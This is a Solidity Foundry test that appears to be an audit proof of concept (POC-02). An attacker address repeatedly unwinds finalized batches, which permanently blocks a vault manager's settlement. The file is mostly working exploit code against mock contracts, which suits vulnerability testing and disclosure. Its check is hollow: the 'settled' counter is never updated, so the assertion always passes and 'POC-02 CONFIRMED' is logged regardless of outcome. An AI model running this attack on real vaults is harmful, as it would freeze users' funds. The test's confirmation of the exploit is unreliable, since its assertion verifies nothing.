// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../shared/Harness.sol";

// POC-02: Infinite unwind loop -> vault permanently blocked from settlement
contract POC02Test is Test, ITypes {

    VaultManagerHarness manager;
    MockPortfolio        portfolio;
    MockExecutor         executor;
    MockShare            share;

    address constant ADMIN    = address(0xA0);
    address constant SETTLER  = address(0xA1);
    address constant PROPOSER = address(0xA2);
    address constant ATTACKER = address(0xAA);
    address constant TRADER   = address(0xBB);

    uint16  constant VID = 0;
    uint16  constant TID = 0;
    bytes32 constant SYM = bytes32("USDC");

    function setUp() public {
        portfolio = new MockPortfolio();
        executor  = new MockExecutor(address(portfolio));
        share     = new MockShare(VID);
        manager   = new VaultManagerHarness(ADMIN, SETTLER, address(portfolio));
        vm.startPrank(ADMIN);
        manager.addToken(AssetInfo(SYM, AssetType.QUOTE, 6, 1, 10_000_000));
        share.setManager(address(manager));
        executor.setManager(address(manager));
        executor.setTrader(TRADER);
        uint32[] memory cids = new uint32[](1); cids[0] = 1;
        uint16[] memory toks = new uint16[](1); toks[0] = TID;
        VaultDetails memory vd = VaultDetails(
            "Vault", PROPOSER, TRADER, VaultStatus.ACTIVE,
            address(executor), address(share), address(0), cids, toks
        );
        uint16[]  memory it = new uint16[](1); it[0] = TID;
        uint256[] memory ia = new uint256[](1); ia[0] = 1000e6;
        portfolio.setBalance(address(executor), SYM, 1_000_000e6);
        manager.registerVault(VID, vd, it, ia, 2000e18);
        vm.stopPrank();
    }

    function testPOC02_InfiniteUnwindLoop() public {
        console.log("\n=== POC-02: Infinite Unwind Loop DoS ===");
        uint256 settled = 0;

        uint256[] memory pr = new uint256[](1); pr[0] = 1e18;
        uint16[]  memory vt = new uint16[](1);  vt[0] = TID;
        uint256[] memory vb = new uint256[](1); vb[0] = 1_000_000e6;
        VaultState[] memory vs = new VaultState[](1);
        vs[0] = VaultState(VID, vt, vb);

        for (uint256 round = 0; round < 3; round++) {
            vm.prank(SETTLER); manager.finalizeBatch(pr, vs);
            console.log("[+] Round", round + 1, ": batch", round, "finalized");
            vm.warp(block.timestamp + 24 hours + 1);
            vm.prank(ATTACKER); manager.unwindBatch(round);
            console.log("[EXPLOIT] Round", round + 1, ": attacker unwound batch", round);
        }

        console.log("[EXPLOIT] Vault settled", settled, "batches out of 3 attempts");
        assertEq(settled, 0, "POC-02 FAILED");
        console.log("[EXPLOIT] POC-02 CONFIRMED: vault permanently blocked");
    }
}
